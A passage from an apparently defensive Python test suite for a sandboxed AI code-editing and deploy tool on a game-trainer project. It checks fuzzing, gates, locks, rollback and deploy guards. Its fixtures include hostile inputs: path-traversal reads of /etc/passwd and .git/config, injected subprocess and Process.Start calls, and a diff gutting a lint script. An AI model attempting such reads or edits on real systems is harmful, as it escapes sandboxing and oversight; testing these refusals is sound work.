        for k in rnd.sample(["path", "start", "end", "pattern", "glob", "max", "i", "old", "new", "content", "summary", "no_change", "args", "input"], rnd.randint(0, 5)):
            obj[k] = rnd.choice(vals)
        try:
            name, a = me.parse_action(json.dumps(obj))
        except me.ProtocolError:
            continue
        except Exception as ex:
            bad.append("parse_action(struct %s): %s %s" % (obj, type(ex).__name__, ex))
            continue
        try:
            if name == "ls":
                ws.ls(a.get("path"))
            elif name == "read":
                ws.read(a["path"], a.get("start"), a.get("end"))
            elif name == "grep":
                ws.grep(a["pattern"], a.get("glob"), a.get("max"), a.get("i"))
            elif name == "edit":
                ws.edit(a["path"], a["old"], a["new"])
            elif name == "create":
                ws.create(a["path"], a["content"])
            done += 1
        except me.ActionError:
            pass
        except Exception as ex:
            bad.append("workspace %s(%s): %s %s" % (name, a, type(ex).__name__, ex))
    check("fuzz: 2500 random junk replies and 2500 random structured actions raise only ProtocolError/ActionError (no crash path), and some of them really executed (%d)" % done, not bad and done > 100, (bad[:3], done))
    escaped = [p.relative_to(root).as_posix() for p in (root / "work").rglob("*") if p.is_file() and p.relative_to(root / "work").parts[0] not in ("src", "tests", "tools", "docs")]
    check("fuzz: nothing was written outside src/ tests/ tools/ docs/ of the workspace, and nothing outside the workspace", not escaped and not (root / "x").exists() and not (Path(tmp) / "x").exists(), escaped)


def test_soak_random_runs(tmp):
    """Whole runs driven by random valid / invalid / hostile replies: none may crash, leave a lock or thread state behind, touch the live tree, or yield a patch with a forbidden path."""
    rnd = random.Random(2026)
    junk = ["", "I will look at the code.", "{", "}{", '{"action":', "```json\n{\"action\":\"ls\"}\n```", "<think>x</think>", "\u0000", "{" * 300 + "}" * 300, '{"action":"ls","path":"../.."}']
    paths = ["src", "src/picker.py", "tests", "tools", "docs", "tools/bot-lint.ps1", "src/new%d.py", "tests/test_x%d.py", "../x", ".git/config", "C:/Windows/win.ini", "src/evil.ps1",
             "tools/mm_engineer.py", "SRC/PICKER.PY", "src/p~1.py"]
    snips = ["best = site", "for site in sites:", "import math", "def dist", "return best", "# nothing", sim.FIX_OLD, "zzz-not-there"]
    news = ["x = 1", "import subprocess\nsubprocess.run(['calc'])", "pm.TeleportTo(x)", sim.FIX_NEW, "", "a\r\nb", "\tindented", "\u00e9"]

    def rand_action():
        a = rnd.choice(["ls", "read", "grep", "edit", "create", "build", "test", "finish", "junk", "junk"])
        if a == "junk":
            return rnd.choice(junk)
        d = {"action": a}
        p = rnd.choice(paths)
        if "%d" in p:
            p = p % rnd.randint(0, 9)
        if a in ("ls", "read", "edit", "create"):
            d["path"] = p
        if a == "read":
            d["start"], d["end"] = rnd.randint(0, 60), rnd.randint(0, 80)
        if a == "grep":
            d["pattern"], d["glob"] = rnd.choice(["pick", "(a+)+", "[", "def \\w+", "blocked"]), rnd.choice([None, "src/*.py", "**/*.py"])
        if a == "edit":
            d["old"], d["new"] = rnd.choice(snips), rnd.choice(news)
        if a == "create":
            d["content"] = rnd.choice(news + ["class A {}\n", "print('hi')\n"])
        if a == "finish":
            d["summary"] = "done"
            d["no_change"] = rnd.random() < 0.3
        return d
    stats, bad = {}, []
    for i in range(20):
        env = Env(tmp, "soak%d" % i, replies=[rand_action() for _ in range(rnd.randint(4, 30))], cfg={"max_steps": rnd.choice([6, 12, 28])})
        live = {str(p): sha(p) for p in env.repo.rglob("*") if p.is_file()}
        env.eng.run_task("E0003")
        rec = env.rec()
        stats[rec["status"]] = stats.get(rec["status"], 0) + 1
        if "internal error" in (rec.get("error") or "") or rec["status"] == "working":
            bad.append("run %d: %s %s" % (i, rec["status"], rec.get("error")))
        if (env.agent / "engineer" / "engineer.lock").exists() or env.eng.busy():
            bad.append("run %d left a lock" % i)
        if {str(p): sha(p) for p in env.repo.rglob("*") if p.is_file()} != live:
            bad.append("run %d modified the live tree" % i)
        if rec["status"] == "patched":
            for f in me.parse_diff((env.agent / "engineer" / "E0003.diff").read_bytes()):
                try:
                    me.check_not_forbidden(f["path"])
                    me.check_writable(f["path"])
                except me.PolicyError:
                    bad.append("run %d patched a forbidden path %s" % (i, f["path"]))
    check("soak: 20 whole runs with random valid/invalid/hostile replies - no crash, no leftover lock, the live tree never touched, no forbidden path in any patch (outcomes %s)" % stats, not bad and sum(stats.values()) == 20, bad[:3])


def test_action_crash_is_contained(tmp):
    env = Env(tmp, "actcrash", replies=[{"action": "ls", "path": "src"}] + HAPPY)
    orig = me.Workspace.ls
    me.Workspace.ls = lambda self, raw: [][0]                            # an engineer-side bug: IndexError inside an action
    try:
        res = env.eng.run_task("E0003")
    finally:
        me.Workspace.ls = orig
    check("action crash: an unexpected exception inside an action becomes an ERROR observation (logged with a traceback), the run goes on and still succeeds",
          res["status"] == "patched" and "internal error while running ls (IndexError" in env.obs(2) and any("action ls crashed" in l and "Traceback" in l for l in env.logs), env.obs(2)[:200])


def test_model_errors(tmp):
    env = Env(tmp, "retry", replies=[RuntimeError("timed out"), RuntimeError("HTTP 500"), {"action": "ls"}] + HAPPY)
    sleeps = []
    env.eng.sleep = sleeps.append
    res = env.eng.run_task("E0003")
    check("model errors: a chat function that raises is retried (2 extra attempts) and the run still succeeds", res["status"] == "patched" and len(env.chat.calls) == 3 + 4 and len(sleeps) == 2, (res["status"], len(env.chat.calls), sleeps))
    env = Env(tmp, "down", replies=[RuntimeError("down"), RuntimeError("down"), RuntimeError("down"), {"action": "ls"}])
    env.eng.run_task("E0003")
    rec = env.rec()
    check("model errors: three failures in a row end the run as failed (model-error) without crashing", rec["status"] == "failed" and "model-error" in rec["error"] and "RuntimeError: down" in rec["error"], rec)
    env = Env(tmp, "empty", replies=["", {"action": "ls"}] + HAPPY)
    res = env.eng.run_task("E0003")
    check("model errors: an empty reply counts as an error and is retried", res["status"] == "patched")


def test_gate_feedback(tmp):
    wrong = {"action": "edit", "path": "src/picker.py", "old": sim.FIX_OLD, "new": sim.FIX_NEW.replace('site["id"]', 'site["name"]')}
    right = {"action": "edit", "path": "src/picker.py", "old": 'if site["name"] in blocked:', "new": 'if site["id"] in blocked:'}
    env = Env(tmp, "gate_tests", replies=[wrong, BUILD, TEST, FINISH, right, FINISH])
    res = env.eng.run_task("E0003")
    t_obs, f_obs = env.obs(4), env.obs(5)
    check("gate loop: the `test` action reports NEW failures separately from the pre-existing ones", "NEW failures (caused by your change):" in t_obs and "test_nearest_site_wins" in t_obs and "KeyError" in t_obs and "Pre-existing failures" in t_obs, t_obs[:500])
    check("gate loop: finish is refused and the feedback names the new failing test, with the cause", "FINISH REFUSED - the gates failed (tests)" in f_obs and "test_nearest_site_wins" in f_obs and "KeyError: 'name'" in f_obs, f_obs[:500])
    rec = env.rec()
    check("gate loop: after the model fixes it the same run ends patched, and the 2 pre-existing failures are recorded as pre-existing, not blamed", res["status"] == "patched" and rec["gates"]["tests"]["new_failures"] == [] and rec["gates"]["tests"]["preexisting"] == [], rec["gates"]["tests"])
    # a patch that does not break anything but also does not fix the 2 failing base tests is accepted (baseline comparison) and says so
    env = Env(tmp, "gate_preexisting", replies=[{"action": "edit", "path": "src/picker.py", "old": "def dist(a, b):", "new": "def dist(a, b):  # euclidean"}, TEST, FINISH])
    res = env.eng.run_task("E0003")
    g = env.rec()["gates"]["tests"]
    check("baseline comparison: failures that already fail without the patch are not blamed on it (gate passes) but are listed", res["status"] == "patched" and len(g["preexisting"]) == 2 and not g["new_failures"], g)
    check("baseline comparison: the base tests ran exactly once (cached for the finish gate)", len(env.runner.test_calls) == 2 and env.runner.test_calls[1].endswith("base"), env.runner.test_calls)
    t_obs = env.obs(3)
    check("baseline comparison: the test observation shows only pre-existing failures when nothing is new", "NEW failures" not in t_obs and "Pre-existing failures" in t_obs, t_obs)
    # lint regression
    bad_lint = {"action": "edit", "path": "src/picker.py", "old": "import math\n", "new": "import math\nimport time\nSTART = time.time()\n"}
    env = Env(tmp, "gate_lint", replies=[FIX, bad_lint, FINISH])
    env.eng.run_task("E0003")
    check("gate loop: a lint regression (check that passes on base) is refused at finish and named", "FINISH REFUSED" in env.obs(4) and "LINT regression(s): lint: no-wallclock" in env.obs(4), env.obs(4)[:400])
    # build failure
    broken = {"action": "edit", "path": "src/picker.py", "old": "    return best\n\n\ndef pick_many", "new": "    return best(\n\n\ndef pick_many"}
    env = Env(tmp, "gate_build", replies=[broken, BUILD, FINISH])
    env.eng.run_task("E0003")
    check("build action: compile errors are reported with file, position and message", "BUILD FAILED" in env.obs(3) and "src/picker.py(" in env.obs(3) and "SyntaxError" in env.obs(3), env.obs(3)[:300])
    check("gate loop: finish is refused with the build error when the workspace does not compile", "FINISH REFUSED - the gates failed (build)" in env.obs(4) and "BUILD FAILED" in env.obs(4), env.obs(4)[:300])
    # no changes
    env = Env(tmp, "gate_nochange", replies=[FINISH, {"action": "finish", "no_change": True, "summary": "act.v1 already exists in src/Act.cs - nothing to do"}])
    res = env.eng.run_task("E0003")
    check("finish without edits is refused ('NO CHANGES'), finish with no_change=true ends as status no-change", "NO CHANGES" in env.obs(2) and res["status"] == "no-change" and env.rec()["status"] == "no-change" and "already exists" in env.rec()["summary"], env.rec())
    # protected / forbidden edits inside the loop
    env = Env(tmp, "prot", replies=[{"action": "edit", "path": "tools/bot-lint.ps1", "old": "cheatCalls", "new": "nothing"}, {"action": "create", "path": "src/run.ps1", "content": "calc"},
                                     {"action": "read", "path": "../../etc/passwd"}, {"action": "read", "path": ".git/config"}, {"action": "edit", "path": "tools/mm_engineer.py", "old": "a", "new": "b"}], cfg={"max_steps": 5})
    env.eng.run_task("E0003")
    check("protected files: the loop answers ERROR for lint-script edits, scripts, traversal, .git and the engineer's own code", all("ERROR:" in env.obs(i) for i in (2, 3, 4, 5)) and "protected" in env.obs(2) and "scripts and binaries" in env.obs(3) and "'..' is not allowed" in env.obs(4) and "forbidden" in env.obs(5), [env.obs(i)[:90] for i in (2, 3, 4, 5)])
    check("protected files: the lint script and engineer files in the real tree are untouched", (env.repo / "tools" / "bot-lint.ps1").read_text() == sim.LINT_PS1)


def test_hygiene_and_server(tmp):
    def litter(root):
        (root / "tests" / "out.txt").write_text("test run output\n")
        (root / "src" / "picker.py.orig").write_text("stray\n")
        (root / "tools" / "helper.py").write_text("# modified by a test run\n")
    runner = FastRunner()
    runner.on_test = litter
    env = Env(tmp, "hygiene", replies=HAPPY, runner=runner)
    res = env.eng.run_task("E0003")
    diff = (env.agent / "engineer" / "E0003.diff").read_text()
    g = env.rec()["gates"]
    check("hygiene: stray files/changes left by a test run are reverted - the diff only has the model's own edit", res["status"] == "patched" and "out.txt" not in diff and "helper.py" not in diff and "picker.py.orig" not in diff and "hygiene" in g and len(g["hygiene"]["fixes"]) == 3, g.get("hygiene"))
    srv_files = {"tools/command_center.py": "import json\nimport incidents\n", "tools/incidents.py": "X = 1\n", "tools/coach-server.py": "import command_center\nimport os\n", "tools/eff_lib.py": "Y = 2\n"}
    env = Env(tmp, "server", replies=[{"action": "edit", "path": "tools/incidents.py", "old": "X = 1", "new": "X = 2"}, BUILD, TEST,
                                       {"action": "finish", "summary": "tweak incidents"}], extra_files=srv_files)
    res = env.eng.run_task("E0003")
    rec = env.rec()
    check("touches_server: editing a module imported by the coach server is flagged (needs a server restart)", rec["touches_server"] is True and not rec["needs_plugin_deploy"], rec)
    check("touches_server: server_files() = the two entry points + the tools modules they import (and nothing else)", env.eng.server_files() == {"tools/coach-server.py", "tools/command_center.py", "tools/incidents.py"}, env.eng.server_files())
    env = Env(tmp, "server2", replies=[{"action": "edit", "path": "tools/command_center.py", "old": "import json", "new": "import json  # x"}, FINISH], extra_files=srv_files)
    env.eng.run_task("E0003")
    check("touches_server: tools/command_center.py edits are allowed but flagged", env.rec()["touches_server"] is True and env.rec()["status"] == "patched")
    env = Env(tmp, "plain", replies=HAPPY)
    env.eng.run_task("E0003")
    check("touches_server: a src/ patch is not flagged and needs a plugin deploy", env.rec()["touches_server"] is False and env.rec()["needs_plugin_deploy"] is True)


def test_concurrency(tmp):
    gate = threading.Event()
    seen = {}

    def blocker(messages):
        seen["status"] = env.eng.status()
        seen["busy_second"] = env.eng.run_task("E0004")
        seen["api"] = env.eng.api_post("/engineer/run", {"id": "E0004"})
        gate.set()
        return {"action": "ls", "path": "src"}
    t4 = dict(sim.TASK, id="E0004", title="second task", function="Other.Second")
    env = Env(tmp, "conc", replies=[blocker] + HAPPY, tasks=[dict(sim.TASK), t4])
    th = threading.Thread(target=env.eng.run_task, args=("E0003",))
    th.start()
    gate.wait(10)
    th.join(30)
    st = seen.get("status", {})
    check("concurrency: while a run is in progress status() reports it (busy, current op/id)", st.get("busy") is True and st.get("current", {}).get("id") == "E0003" and st["counts"].get("working") == 1, st.get("current"))
    check("concurrency: a second run_task is refused as busy (one engineer operation at a time)", seen["busy_second"]["ok"] is False and "busy" in seen["busy_second"]["error"])
    check("concurrency: the HTTP-style API answers 409 busy as well", seen["api"][0] == 409)
    check("concurrency: the first run still completes normally afterwards", env.rec()["status"] == "patched" and env.eng.status()["busy"] is False)
    # a foreign (other process) lock blocks only while that process is alive AND its heartbeat is fresh
    alive_pid = os.getppid()                                          # the shell that started this test is certainly alive
    done = subprocess.Popen(["cmd", "/c", "exit", "0"] if os.name == "nt" else ["true"])
    done.wait()
    try:
        env = Env(tmp, "lock", replies=list(HAPPY))
        lock = env.agent / "engineer" / "engineer.lock"
        lock.parent.mkdir(parents=True, exist_ok=True)
        check("pid_alive: a running process is alive, a finished one and garbage are not", me.pid_alive(alive_pid) and me.pid_alive(os.getpid()) and not me.pid_alive(done.pid) and not me.pid_alive(None) and not me.pid_alive(-5) and not me.pid_alive("x"))
        lock.write_text(json.dumps({"pid": alive_pid, "op": "run", "id": "E0009", "t": time.time()}))
        r = env.eng.run_task("E0003")
        check("lock file: a fresh lock held by another LIVE process blocks a run (busy)", r["ok"] is False and "busy" in r["error"] and env.eng.busy() is True, r)
        lock.write_text(json.dumps({"pid": alive_pid, "op": "run", "id": "E0009", "t": time.time() - 600}))
        r = env.eng.run_task("E0003")
        check("lock file: a stale lock (10 minutes without a heartbeat) is ignored", r["status"] == "patched", r)
        env = Env(tmp, "lock2", replies=list(HAPPY))
        lock = env.agent / "engineer" / "engineer.lock"
        lock.parent.mkdir(parents=True, exist_ok=True)
        lock.write_text(json.dumps({"pid": done.pid, "op": "run", "id": "E0009", "t": time.time()}))
        r = env.eng.run_task("E0003")
        check("lock file: a fresh lock whose process is dead (crashed server) does not block", r["status"] == "patched", r)
    finally:
        pass
    env = Env(tmp, "hb", replies=list(HAPPY))
    gate, inside = threading.Event(), threading.Event()
    env.chat.replies.insert(0, lambda m: (inside.set(), gate.wait(10), {"action": "ls", "path": "src"})[2])
    th = threading.Thread(target=env.eng.run_task, args=("E0003",))
    th.start()
    inside.wait(10)
    lk = json.loads((env.agent / "engineer" / "engineer.lock").read_text())
    check("lock file: while a run is in progress it exists, names this process, the op and the task", lk["pid"] == os.getpid() and lk["op"] == "run" and lk["id"] == "E0003" and env.eng.busy())
    gate.set()
    th.join(30)
    check("lock file: it is removed when the run ends", not (env.agent / "engineer" / "engineer.lock").exists())


# ================================================================================================================ G. apply_patch
def test_apply(tmp):
    env = patched_env(tmp, "apply1")
    real, eng_real = env.real()
    runner = env.runner
    before = (real / "src" / "picker.py").read_bytes()
    res = eng_real.apply_patch("E0003")
    after = (real / "src" / "picker.py").read_text()
    rec = env.rec()
    check("apply: a clean patch applies to the (copy of the) real tree and the status becomes applied", res["ok"] and res["status"] == "applied" and rec["status"] == "applied" and "if site[\"id\"] in blocked:" in after, res)
    check("apply: the result is byte-identical to the model's workspace file", (real / "src" / "picker.py").read_bytes() == (env.agent / "engineer" / "work" / "E0003" / "work" / "src" / "picker.py").read_bytes())
    prev = env.agent / "engineer" / "E0003.prev"
    check("apply: backups of the touched files are stored in <id>.prev/ with a manifest", (prev / "src" / "picker.py").read_bytes() == before and json.loads((prev / "_manifest.json").read_text())["files"]["src/picker.py"]["existed"] is True)
    check("apply: post-apply hashes are recorded and applied_at is set", rec["post_hashes"]["src/picker.py"] == sha(real / "src" / "picker.py") and rec["applied_at"] > 0, rec.get("post_hashes"))
    check("apply: the post-apply hashes are also stored in the backup manifest next to the pre-apply hash",
          json.loads((prev / "_manifest.json").read_text())["post"] == rec["post_hashes"] and json.loads((prev / "_manifest.json").read_text())["files"]["src/picker.py"]["sha"] == hashlib.sha256(before).hexdigest())
    check("apply: the build gate ran on the REAL tree (not only in the workspace)", str(real) in runner.build_calls, runner.build_calls)
    check("apply: the scratch artifacts dir used for that build is cleaned up", not any((env.agent / "engineer" / "scratch").glob("*")) if (env.agent / "engineer" / "scratch").exists() else True)
    check("apply: only a patched task can be applied (a second apply is refused)", eng_real.apply_patch("E0003")["ok"] is False)

    # conflict: the real tree moved under the patch
    env = patched_env(tmp, "apply_conflict")
    real, eng_real = env.real()
    p = real / "src" / "picker.py"
    p.write_text(p.read_text().replace("    for site in sites:\n", "    for site in list(sites):  # other agent edit\n"))
    h = sha(p)
    res = eng_real.apply_patch("E0003")
    rec = env.rec()
    check("conflict: git apply --check fails -> status conflict, nothing touched", res["ok"] is False and res["status"] == "conflict" and sha(p) == h and not (env.agent / "engineer" / "E0003.prev" / "src").exists(), res)
    check("conflict: the task goes back to queued with a note and a conflict counter", rec["status"] == "queued" and "conflict" in rec["note"] and rec["conflicts"] == 1, rec)
    check("conflict: no build was run on the real tree for a conflicting patch", str(real) not in env.runner.build_calls)

    # build fails after apply -> automatic restore
    env = patched_env(tmp, "apply_buildfail")
    real, eng_real = env.real()
    orig = (real / "src" / "picker.py").read_bytes()
    env.runner.fail_build_roots.add(str(real))
    res = eng_real.apply_patch("E0003")
    rec = env.rec()
    check("auto-restore: a failing post-apply build restores the backups (file is byte-identical to before)", res["ok"] is False and res["status"] == "apply-failed" and (real / "src" / "picker.py").read_bytes() == orig, res)
    check("auto-restore: status apply-failed with the build error recorded", rec["status"] == "apply-failed" and "did not build" in rec["error"] and "injected build failure" in rec["error"] and rec["restore"]["restored"] == ["src/picker.py"], rec)

    # restore only if the file still hashes to the post-apply hash
    env = patched_env(tmp, "apply_restore_guard")
    real, eng_real = env.real()

    def newer_edit(root):
        if str(root) == str(real):
            f = real / "src" / "picker.py"
            f.write_text(f.read_text() + "\n# someone else edited this during the build\n")
    env.runner.on_build = newer_edit
    env.runner.fail_build_roots.add(str(real))
    res = eng_real.apply_patch("E0003")
    txt = (real / "src" / "picker.py").read_text()
    check("auto-restore: a file that changed after the apply is NOT overwritten (reported as skipped)", res["status"] == "apply-failed" and "someone else edited" in txt and res["restore"]["skipped"][0]["file"] == "src/picker.py" and "modified since" in res["restore"]["skipped"][0]["reason"], res)

    # new file in the patch: restore removes it
    env = Env(tmp, "apply_newfile", replies=[{"action": "create", "path": "src/extra.py", "content": "VALUE = 42\n"}, FIX, BUILD, TEST, FINISH])
    env.eng.run_task("E0003")
    real, eng_real = env.real()
    env.runner.fail_build_roots.add(str(real))
    res = eng_real.apply_patch("E0003")
    check("auto-restore: a file created by the patch is removed again when the build fails", res["status"] == "apply-failed" and not (real / "src" / "extra.py").exists() and res["restore"]["removed"] == ["src/extra.py"] and res["restore"]["restored"] == ["src/picker.py"], res)
    env.runner.fail_build_roots.clear()
    # the task is apply-failed now: requeue + rerun is the documented path; revert() is only for applied tasks
    check("apply-failed tasks can be requeued", eng_real.requeue("E0003")["status"] == "queued")

    # git apply dies half way (reports failure after it already wrote the files): everything it wrote is undone
    env = Env(tmp, "apply_partial", replies=[{"action": "create", "path": "src/extra.py", "content": "VALUE = 42\n"}, FIX, BUILD, TEST, FINISH])
    env.eng.run_task("E0003")
    real, eng_real = env.real()
    orig = (real / "src" / "picker.py").read_bytes()
    real_run = me.run_cmd

    def dies_after_writing(args, cwd=None, timeout=300, env=None, tree=True):
        rc, out, to = real_run(args, cwd=cwd, timeout=timeout, env=env, tree=tree)          # the real git apply runs and writes both files ...
        if "apply" in args and "--check" not in args:
            return 1, "error: unable to unlink old 'src/picker.py': Permission denied", False   # ... but reports failure
        return rc, out, to
    me.run_cmd = dies_after_writing
    try:
        res = eng_real.apply_patch("E0003")
    finally:
        me.run_cmd = real_run
    check("apply: when git apply reports failure after it already wrote files, the partial result is undone (modified file restored, created file removed)",
          res["status"] == "apply-failed" and (real / "src" / "picker.py").read_bytes() == orig and not (real / "src" / "extra.py").exists()
          and sorted(res["restore"]["restored"] + res["restore"]["removed"]) == ["src/extra.py", "src/picker.py"] and not res["restore"]["skipped"], res)

    # CRLF + BOM files in the real tree, both git autocrlf modes
    for mode in ("true",):          # the system config of this machine (autocrlf=true) is the dangerous one; the engineer forces false for git apply
        crlf_src = ("\ufeff" + sim.PICKER.replace("\n", "\r\n")).encode("utf-8")
        env = Env(tmp, "apply_crlf_" + mode, replies=[{"action": "edit", "path": "src/picker.py", "old": sim.FIX_OLD, "new": sim.FIX_NEW}, BUILD, FINISH], extra_files={"src/picker.py": crlf_src})
        env.eng.run_task("E0003")
        real, eng_real = env.real()
        os.environ["GIT_CONFIG_COUNT"], os.environ["GIT_CONFIG_KEY_0"], os.environ["GIT_CONFIG_VALUE_0"] = "1", "core.autocrlf", mode
        try:
            res = eng_real.apply_patch("E0003")
        finally:
            for k in ("GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0", "GIT_CONFIG_VALUE_0"):
                os.environ.pop(k, None)
        got = (real / "src" / "picker.py").read_bytes()
        check("apply: a BOM + CRLF file in the real tree is patched and keeps BOM and CRLF (git core.autocrlf=%s)" % mode, res.get("ok") and got.startswith(b"\xef\xbb\xbf") and b"\r\n" in got and got.count(b"\n") == got.count(b"\r\n") and b'if site["id"] in blocked:\r\n' in got, (res, got[:80]))

    # tampered / re-validated diffs
    env = patched_env(tmp, "apply_tamper")
    real, eng_real = env.real()
    dp = env.agent / "engineer" / "E0003.diff"
    dp.write_bytes(dp.read_bytes() + b"\n")
    res = eng_real.apply_patch("E0003")
    check("apply: a diff file that changed after the gates passed (sha256 mismatch) is refused and the task fails", res["ok"] is False and "sha256" in res["error"] and env.rec()["status"] == "failed" and (real / "src" / "picker.py").read_text() == sim.PICKER)
    env = patched_env(tmp, "apply_revalidate")
    real, eng_real = env.real()
    evil = me.make_file_diff("tools/bot-lint.ps1", sim.LINT_PS1.encode(), b"# gutted\n")
    dp = env.agent / "engineer" / "E0003.diff"
    dp.write_bytes(evil)
    eng_real._update("E0003", diff_sha256=hashlib.sha256(evil).hexdigest())
    res = eng_real.apply_patch("E0003")
    check("apply: the diff is re-validated against the path policy at apply time (a protected path in it is refused)", res["ok"] is False and "re-validation" in res["error"] and (real / "tools" / "bot-lint.ps1").read_text() == sim.LINT_PS1, res)
    env = patched_env(tmp, "apply_rescan")
    real, eng_real = env.real()
    evil = me.make_file_diff("src/Bad.cs", None, b"class B { void F() { System.Diagnostics.Process.Start(\"x\"); } }\n")
    dp = env.agent / "engineer" / "E0003.diff"
    dp.write_bytes(evil)
    eng_real._update("E0003", diff_sha256=hashlib.sha256(evil).hexdigest())
    res = eng_real.apply_patch("E0003")
    check("apply: the safety scan runs again at apply time", res["ok"] is False and "safety scan" in res["error"] and not (real / "src" / "Bad.cs").exists(), res)
    env = Env(tmp, "apply_status")
    check("apply: a queued (not patched) task cannot be applied", env.eng.apply_patch("E0003")["ok"] is False and env.eng.apply_patch("NOPE")["status"] == "unknown")

    # revert of an applied (not deployed) patch
    env = patched_env(tmp, "revert")
    real, eng_real = env.real()
    eng_real.apply_patch("E0003")
    res = eng_real.revert("E0003")
    check("revert: an applied patch can be undone from the backups (status back to patched, file identical to the original)", res["ok"] and (real / "src" / "picker.py").read_text() == sim.PICKER and env.rec()["status"] == "patched", res)


# ================================================================================================================ H. deploy
def applied_env(tmp, name, real_git=False, **kw):
    """A patched task that is 'applied' to the live-tree copy. real_git=True goes through apply_patch (git apply + build gate); the default writes the
    same end state directly (backup + manifest + post hashes + status) so the deploy guard tests do not pay for a git subprocess each time."""
    env = patched_env(tmp, name, **kw)
    real, eng_real = env.real()
    if real_git:
        res = eng_real.apply_patch("E0003")
        assert res["ok"], res
        return env, real, eng_real
    target = real / "src" / "picker.py"
    prev = env.agent / "engineer" / "E0003.prev"
    (prev / "src").mkdir(parents=True)
    shutil.copyfile(target, prev / "src" / "picker.py")
    (prev / "_manifest.json").write_text(json.dumps({"task": "E0003", "t": env.clock(), "files": {"src/picker.py": {"existed": True, "sha": sha(target)}}}))
    shutil.copyfile(env.agent / "engineer" / "work" / "E0003" / "work" / "src" / "picker.py", target)
    eng_real._update("E0003", status="applied", applied_at=env.clock(), error="", post_hashes={"src/picker.py": sha(target)}, prev_dir=str(prev))
    return env, real, eng_real


def test_deploy(tmp):
    env = Env(tmp, "dep0")
    check("deploy: refused unless the task is applied", env.eng.deploy("E0003", confirm=True)["ok"] is False and "only an applied task" in env.eng.deploy("E0003", confirm=True)["error"])
    env, real, eng = applied_env(tmp, "dep1", real_git=True)
    dep = env.deployer
    r = eng.deploy("E0003")
    check("deploy: refused without the confirm flag (nothing runs, nothing is backed up)", r["ok"] is False and "confirmation required" in r["error"] and dep.deploys == 0 and not (env.agent / "engineer" / "backups").exists(), r)
    r = eng.deploy("E0003", confirm="yes")
    check("deploy: a truthy non-True confirm (a string) is not a confirmation", r["ok"] is False and dep.deploys == 0)
    r = eng.deploy("E0003", confirm=True)
    rec = env.rec()
    backups = list((env.agent / "engineer" / "backups").glob("ThronefallTrainer.*.dll"))
    check("deploy: with confirm=True it backs up the deployed DLL first (identical content, timestamped name)", len(backups) == 1 and backups[0].read_bytes() == b"OLD-DLL" and re.fullmatch(r"ThronefallTrainer\.\d{8}-\d{6}\.dll", backups[0].name), backups)
    check("deploy: calls the deploy hook once, then the health check with the deploy start time and the pid seen before", dep.deploys == 1 and len(dep.health_ctx) == 1 and dep.health_ctx[0]["since_t"] == env.clock() and "pid_before" in dep.health_ctx[0], dep.health_ctx)
    check("deploy: status deployed with deployed_at, health detail and backup path recorded", r["ok"] and rec["status"] == "deployed" and rec["deployed_at"] > 0 and "audit.json" in rec["health"] and rec["backup_dll"] == str(backups[0]), rec)
    check("deploy: the new DLL is in place and the source patch stays applied", dep.dll.read_bytes() == b"NEW-DLL" and "in blocked" in (real / "src" / "picker.py").read_text())

    # cooldown, persisted across Engineer instances
    env, real, eng = applied_env(tmp, "dep2")
    eng.deploy("E0003", confirm=True)
    t4 = dict(sim.TASK, id="E0004", title="second task", function="Other.Second")
    sim.write_queue(env.agent, [dict(sim.TASK), t4])
    eng._update("E0004", status="applied", needs_plugin_deploy=True, touches_server=False)
    r = eng.deploy("E0004", confirm=True)
    check("cooldown: a second deploy right after the first is refused with the remaining time (default 900 s)", r["ok"] is False and "cooldown" in r["error"] and 890 <= r["cooldown_remaining_s"] <= 900 and env.deployer.deploys == 1, r)
    eng_new = env.make(real)
    r = eng_new.deploy("E0004", confirm=True)
    check("cooldown: it survives a restart of the engineer (state.json)", r["ok"] is False and "cooldown" in r["error"])
    env.clock.t += 901
    r = eng_new.deploy("E0004", confirm=True)
    check("cooldown: after 901 s the deploy goes ahead", r["ok"] is True and env.deployer.deploys == 2, r)

    # health failure -> rollback of the DLL and of the source
    env, real, eng = applied_env(tmp, "dep3", real_git=True)
    env.deployer.health_result = (False, "no healthy plugin within 150s: audit.json 311s old")
    orig_src = sim.PICKER
    r = eng.deploy("E0003", confirm=True)
    rec = env.rec()
    check("rollback: a failing health check restores the backed-up DLL via the restore hook", r["ok"] is False and r["status"] == "rolled-back" and len(env.deployer.restores) == 1 and env.deployer.dll.read_bytes() == b"OLD-DLL" and env.deployer.restores[0].endswith(".dll"), r)
    check("rollback: the source patch is reverted too (the tree must not stay ahead of the deployed DLL)", (real / "src" / "picker.py").read_text() == orig_src and rec["rollback"]["source"]["restored"] == ["src/picker.py"], rec.get("rollback"))
    check("rollback: status rolled-back with the health failure and rolled_back_at recorded", rec["status"] == "rolled-back" and "deploy rolled back" in rec["error"] and "311s" in rec["error"] and "health check failed" in r["error"] and rec["rolled_back_at"] > 0, rec)
    check("rollback: a rolled-back task can be requeued but not deployed again", eng.deploy("E0003", confirm=True)["ok"] is False and eng.requeue("E0003")["status"] == "queued")

    # the source is NOT reverted over newer edits
    env, real, eng = applied_env(tmp, "dep4")
    env.deployer.health_result = (False, "dead")
    f = real / "src" / "picker.py"
    f.write_text(f.read_text() + "\n# newer edit\n")
    r = eng.deploy("E0003", confirm=True)
    check("rollback: source files edited after the apply are left alone (skipped), the DLL is still restored", r["status"] == "rolled-back" and "newer edit" in f.read_text() and r["rollback"]["source"]["skipped"] and env.deployer.dll.read_bytes() == b"OLD-DLL", r)

    # deploy hook failures
    env, real, eng = applied_env(tmp, "dep5")
    env.deployer.write_dll = False
    env.deployer.deploy_raises = RuntimeError("build failed in the deploy script")
    r = eng.deploy("E0003", confirm=True)
    check("deploy failure before the DLL changed: the task stays applied, no rollback/restart, the error is reported", r["ok"] is False and r["status"] == "applied" and not env.deployer.restores and env.rec()["status"] == "applied" and "deploy script failed" in env.rec()["error"], r)
    env, real, eng = applied_env(tmp, "dep6")
    env.deployer.deploy_raises = RuntimeError("killed halfway")
    r = eng.deploy("E0003", confirm=True)
    check("deploy failure after the DLL was replaced: it is rolled back (DLL restored)", r["status"] == "rolled-back" and env.deployer.dll.read_bytes() == b"OLD-DLL" and len(env.deployer.restores) == 1, r)
    env, real, eng = applied_env(tmp, "dep7")
    env.deployer.deploy_result = {"ok": False, "error": "hash mismatch"}
    env.deployer.write_dll = False
    r = eng.deploy("E0003", confirm=True)
    check("deploy hook returning ok=false before touching the DLL leaves the task applied", r["status"] == "applied" and "hash mismatch" in r["error"])
    env, real, eng = applied_env(tmp, "dep7b")
    env.deployer.deploy_result = {"ok": False, "error": "copy failed after the game was killed", "game_down": True}
    env.deployer.write_dll = False
